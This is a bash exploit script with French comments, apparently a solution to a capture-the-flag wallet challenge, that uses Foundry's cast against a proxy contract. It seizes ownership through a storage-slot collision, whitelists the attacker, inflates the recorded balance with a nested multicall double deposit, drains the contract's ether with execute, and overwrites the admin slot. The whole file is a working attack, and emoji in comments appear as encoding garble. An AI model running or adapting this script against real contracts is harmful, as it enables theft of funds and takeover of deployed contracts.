#!/bin/bash

# ------------------------------------------
# ‚öôÔ∏è Chargement de l'environnement
# ------------------------------------------
if [ -z "$TARGET" ] || [ -z "$PRIVATE_KEY" ] || [ -z "$RPC_URL" ]; then
  echo "‚ùå Variables manquantes. Assure-toi que .env contient TARGET, PRIVATE_KEY et RPC_URL"
  exit 1
fi

ATTACKER=$(cast wallet address $PRIVATE_KEY)
export ETH_RPC_URL=$RPC_URL
# ------------------------------------------
# üîê √âtape 1 : Prendre ownership (slot 0 ‚Üí owner)
# ------------------------------------------
echo "üîë 1. Se proposer en tant que futur admin (va √©craser owner)..."
cast send $TARGET "proposeNewAdmin(address)" $ATTACKER --private-key $PRIVATE_KEY

# V√©rification du owner
OWNER=$(cast call $TARGET "owner()")
echo "‚úÖ Owner (via slot 0) maintenant : $OWNER"

# ------------------------------------------
# ‚úÖ √âtape 2 : S'ajouter √† la whitelist
# ------------------------------------------
echo "üë§ 2. Ajout de l'adresse √† la whitelist..."
cast send $TARGET "addToWhitelist(address)" $ATTACKER --private-key $PRIVATE_KEY

# ------------------------------------------
# üß™ √âtape 3 : Double deposit via multicall nested
# ------------------------------------------

# G√©n√©rer les calldata
DEPOSIT_SELECTOR="0xd0e30db0"
INNER_MULTICALL=$(cast calldata "multicall(bytes[])" "[$DEPOSIT_SELECTOR]")
OUTER_MULTICALL=$(cast calldata "multicall(bytes[])" "[$DEPOSIT_SELECTOR, $INNER_MULTICALL]")

echo "üí∞ 3. Ex√©cution du nested multicall avec 0.001 ETH..."
cast send $TARGET "multicall(bytes[])" "[$DEPOSIT_SELECTOR, $INNER_MULTICALL]" \
  --value 0.001ether --private-key $PRIVATE_KEY

# V√©rification du solde
BALANCE=$(cast call $TARGET "balances(address)" $ATTACKER)
CONTRACT_BAL=$(cast balance $TARGET)
echo "üìä Balance du contrat : $CONTRACT_BAL wei"
echo "üìä Balance de l'attaquant enregistr√©e : $BALANCE wei"

# ------------------------------------------
# üöÄ √âtape 4 : Vider le contrat avec execute
# ------------------------------------------
echo "üö® 4. Vidage du contrat..."
cast send $TARGET "execute(address,uint256,bytes)" $ATTACKER $CONTRACT_BAL "0x" \
  --private-key $PRIVATE_KEY

# ------------------------------------------
# üõ†Ô∏è √âtape 5 : Changer maxBalance ‚Üí √©craser admin
# ------------------------------------------
echo "üèÅ 5. Surcharge du slot admin via setMaxBalance..."
cast send $TARGET "setMaxBalance(uint256)" $ATTACKER --private-key $PRIVATE_KEY

# V√©rification finale
RAW=$(cast call $TARGET "admin()")
STRIPPED="0x${RAW:26}"
ADMIN=$(cast to-check-sum-address $STRIPPED)
echo "üéâ Admin actuel : $ADMIN"
if [[ "${ADMIN,,}" == "${ATTACKER,,}" ]]; then
    echo "‚úÖ Exploitation r√©ussie : vous √™tes admin du proxy"
else
    echo "‚ùå √âchec de l'exploit"
fi
